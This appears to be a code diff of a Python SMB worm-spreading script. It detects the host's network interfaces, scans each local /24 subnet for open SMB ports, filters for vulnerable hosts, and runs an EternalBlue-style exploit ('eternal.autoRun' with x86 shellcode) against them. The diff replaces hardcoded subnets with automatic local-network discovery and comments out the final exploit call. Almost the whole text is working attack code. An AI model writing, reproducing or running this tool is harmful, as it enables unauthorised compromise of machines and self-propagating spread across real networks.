@@ -1,11 +1,34 @@
+#!/usr/bin/python
 import gevent
 from gevent import socket
+from libs.mysmb import MYSMB
 from struct import pack
-from mysmb import MYSMB
 from netaddr import IPNetwork
-import eternal
+from libs import eternal
+import netifaces as ni
+import fcntl
 
-TargetList = []
+def get_ip(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,
+        pack('256s', ifname[:15])
+    )[20:24])
+
+
+def ret_ip():
+    if_list = ni.interfaces()
+    ips = []
+
+    for iface in if_list:
+        try:
+            ip = get_ip(str(iface))
+            if '127.0.0.1' not in ip:
+                ips.append(ip)
+        except:
+            pass
+    return ips
 
 def scan(ip):
     ip = str(ip)
@@ -19,23 +42,13 @@ def scan(ip):
         pass
     s.close()
 
-def threading():
-    jobs = [gevent.spawn(scan, i) for i in IPNetwork("172.16.60.0/24")]
-    gevent.joinall(jobs, timeout=int(1))
-
-def threading2():
-    jobs = [gevent.spawn(scan, i) for i in IPNetwork("172.16.65.0/24")]
+def threading(ip):
+    jobs = [gevent.spawn(scan, i) for i in IPNetwork(ip+"/24")]
     gevent.joinall(jobs, timeout=int(1))
 
 def exploit(targets):
     for i in targets:
-        print(i)
-#        try:
         eternal.autoRun(i,"sc_x86.bin")
- #       except:
-  #          pass
-
-
 
 def check(open_smb):
     vulnerable_smb = []
@@ -60,9 +73,11 @@ def check(open_smb):
 
     return vulnerable_smb
 
-if __name__ == "__main__":
-    threading()
-    threading2()
+if __name__ == '__main__':
+    TargetList = []
+    print(ret_ip())
+    for ip in ret_ip():
+    	threading(ip)
     targets = check(TargetList)
     print(targets)
-    exploit(targets)
+    #exploit(targets)
